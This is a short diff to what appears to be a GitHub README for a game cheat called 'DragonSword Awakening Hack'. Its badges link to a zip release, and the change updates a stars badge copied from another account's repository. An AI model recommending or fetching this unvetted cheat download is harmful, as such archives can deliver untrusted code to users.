@@ -4,7 +4,7 @@
 [![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/RaikageDisplay/DragonSword-Awakening-Hack-V1/releases/download/v1.3/DSAW-V1.zip)
 [![GitHub release](https://img.shields.io/badge/Release-v1-blue?style=for-the-badge)](https://github.com/RaikageDisplay/DragonSword-Awakening-Hack-V1/releases/download/v1.3/DSAW-V1.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](https://opensource.org/licenses/MIT)
-[![Stars](https://img.shields.io/github/stars/Crushflalead/DragonSword-Awakening-Trainer?style=for-the-badge&logo=github)](https://github.com/RaikageDisplay/DragonSword-Awakening-Hack-V1/stargazers)
+[![Stars](https://img.shields.io/github/stars/RaikageDisplay/DragonSword-Awakening-Hack-V1?style=for-the-badge&logo=github)](https://github.com/RaikageDisplay/DragonSword-Awakening-Hack-V1/stargazers)
 
 
 
